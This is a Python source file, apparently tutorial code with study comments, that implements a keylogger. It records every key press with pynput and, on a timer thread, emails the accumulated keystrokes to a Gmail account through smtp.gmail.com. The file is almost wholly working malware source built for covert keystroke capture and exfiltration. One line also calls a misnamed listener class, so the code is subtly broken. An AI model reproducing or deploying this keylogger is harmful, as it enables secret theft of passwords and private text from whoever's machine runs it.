#!/usr/bin/env python
# implement in class as variable have to declare in global scope and use in local scope
# two type of keylogger local(stored log in local sys),remote(report by sending mail based on time interval).
# we will study threading,oop,recursive fun
# pip install pynput(in linux may be same for window) it allow us to control mouse and keybord but for this we only use for keyboard
 
import pynput.keyboard
import threading,smtplib
class Keylogger:#best practice start with capital letter and fun inside class called method
    def __init__(self,time_interval,email,password):
        self.log="Keylogger Started"#rather empty it will inform by first mail sending this message
        self.interval=time_interval
        self.email=email
        self.password=password
    def append_to_log(self,string):
        self.log=self.log + string

    def process_key_press(self,key):
        try:
            current_key=str(key.char)#.char will not print 'u'in every letter you type and for special key like space makes error so use try catch
            
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:    
                current_key=" " + str(key) + " "
        self.append_to_log(current_key)        
    def report(self):
        print(self.log)
        self.send_mail(self.email,self.password,"\n\n" + self.log)#two line below dont appent our message in subject part of email rather in content  part
        self.log=""
        timer=threading.Timer(self.interval,self.report)#after timer starts wait for 5 sec and call fun again and there is recursive fun in timer fun calling itself
        # here timer is thread runs on different line(background) hence at same time othe program (listener)also execute
        timer.start()
    def send_mail(self,email,password,message):#
        server=smtplib.SMTP("smtp.gmail.com",587)#smtp.gmail.com is server that i want to use which is google server 587=port of that server 
        server.starttls()#initiate tls
        server.login(email,password)
        server.sendmail(email,email,message)#here from and to same mail address
        server.quit()
    
    def start(self):    
        keyboard_listener=pynput.keyboard.listener(on_press=self.process_key_press)#on_press is callback funclaaed when key is pressed
        with keyboard_listener:
            self.report()#problem it is infinite and dont go next line 
            keyboard_listener.join()#if it was above it is also infinite and dont go next line so soln threading
#so function(any code) executed every no of sec and dont interrupt the execution of program use thresholding 
# thread runs in background and never interrupt program execution
# report every "x" sec and dont interrupt lisining to keystrok by listner so use thread.
# so in this way more than one thread can be run simultaneously at same time
# basically with keyword in py is to interact with unmanaged stream of data sa above
# killall python command on another splitted cmmand line will kill all py code running on that sys